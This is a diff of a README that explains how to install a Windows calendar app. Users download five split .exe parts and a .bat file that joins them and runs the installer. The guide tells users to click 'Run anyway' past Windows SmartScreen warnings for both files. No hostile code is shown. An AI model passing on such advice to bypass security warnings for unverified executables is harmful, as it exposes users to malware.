@@ -1,15 +1,18 @@
 # 💻 Install Simple Calendar on Windows
 
-## 1. Download these 6 files into the same folder
-1. [⬇️ Part 1](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.00.part)
-2. [⬇️ Part 2](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.01.part)
-3. [⬇️ Part 3](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.02.part)
-4. [⬇️ Part 4](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.03.part)
-5. [⬇️ Part 5](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer.exe.04.part)
-6. [⬇️ Install-Simple-Calendar.bat](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Install-Simple-Calendar.bat)
+## 1. Delete old downloads (if updating)
+Open your **Downloads** folder and delete old Simple Calendar files: `Simple-Calendar-Windows-Installer….part`, `Simple-Calendar-Windows-Installer….exe` and `Install-Simple-Calendar….bat` (including ones with `(1)` in the name).
 
-## 2. Double-click Install-Simple-Calendar.bat
-It joins the parts and opens the installer for you.
+## 2. Download these 6 files into the same folder
+1. [⬇️ Part 1](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v41.exe.00.part)
+2. [⬇️ Part 2](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v41.exe.01.part)
+3. [⬇️ Part 3](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v41.exe.02.part)
+4. [⬇️ Part 4](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v41.exe.03.part)
+5. [⬇️ Part 5](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Simple-Calendar-Windows-Installer-v41.exe.04.part)
+6. [⬇️ Install-Simple-Calendar-v41.bat](https://github.com/0MrCrazy0/calendar/raw/refs/heads/main/Simple-Calendar-Windows-Installer/Install-Simple-Calendar-v41.bat)
+
+## 3. Double-click Install-Simple-Calendar-v41.bat
+It joins the parts into **Simple-Calendar-Windows-Installer-v41.exe** and opens the installer for you.
 - If Windows says "Windows protected your PC", click **More info**, then **Run anyway**. You'll see this once for the .bat file and once for the installer.
 - Leave **Start at login** ticked so alarms always work.
 
@@ -18,13 +21,13 @@ It joins the parts and opens the installer for you.
 - Alarms only ring while your PC is on.
 
 ## ⬆️ Updating
-The app checks for updates once a day and shows **Update available** when a new version is out. You can also use **Options → Check for updates**, or right-click the tray icon and choose **Check for updates**.
+The app checks for updates regularly and shows **Update available** when a new version is out. You can also use **Options → Check for updates**, or right-click the tray icon and choose **Check for updates**.
 
-Download the new parts and run **Install-Simple-Calendar.bat** again. It installs over the old version, and your events, marks and settings are kept.
+Delete the old downloads (step 1), download the new files and run the new **.bat**. It installs over the old version, and your events, marks and settings are kept.
 
 ## ❓ Help
-- **"Cannot find the file":** make sure all 6 files are in the same folder.
-- **Installer won't open:** the joined file should be about 94 MB. If it's smaller, download the parts again.
+- **"Missing file":** the .bat names the part it can't find. Download that part again into the same folder as the .bat.
+- **Installer won't open:** the joined file should be about 95 MB. If it isn't, the .bat tells you; download the parts again.
 - **No alarm:** check the tray icon is there and Focus / Do not disturb is off.
 
 [⬅️ Back to Simple Calendar](https://github.com/0MrCrazy0/calendar)
